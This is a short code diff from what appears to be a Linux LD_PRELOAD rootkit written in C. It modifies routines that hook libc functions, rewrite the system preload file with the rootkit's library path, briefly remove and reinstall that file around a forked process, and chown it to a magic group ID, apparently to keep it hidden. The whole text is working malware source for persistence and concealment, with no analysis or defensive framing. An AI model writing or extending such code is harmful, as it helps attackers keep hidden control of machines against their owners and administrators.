@@ -2,6 +2,7 @@ void reinstall(void)
 {   
     HOOK(o_xstat, C__XSTAT);
     HOOK(o_access, CACCESS);
+    HOOK(o_chown,CCHOWN);
 
     FILE *preload;
     struct stat s_fstat;
@@ -18,9 +19,6 @@ void reinstall(void)
             o_fwrite(sopath, strlen(sopath), 1, preload);
             fflush(preload); fclose(preload);
         }
-
-        HOOK(o_chown,CCHOWN);
-        o_chown(ldsp,MGID,MGID);
     }
     CLEAN(sopath);
     CLEAN(ldsp);
@@ -38,7 +36,6 @@ int hbdvl(const char *filename, const char *proc, int ret)
         HOOK(o_unlink,CUNLINK);
         char *ldsp=strdup(LDSO_PRELOAD); xor(ldsp);
         o_unlink(ldsp);
-        CLEAN(ldsp);
 
         int pid;
         if((pid = fork()) == -1) return -1;
@@ -46,6 +43,8 @@ int hbdvl(const char *filename, const char *proc, int ret)
 
         wait(&ret);
         reinstall();
+        if(!hxstat(ldsp,MGID,32)) o_chown(ldsp,MGID,MGID);
+        CLEAN(ldsp);
         return 1;
     }
     return 3;
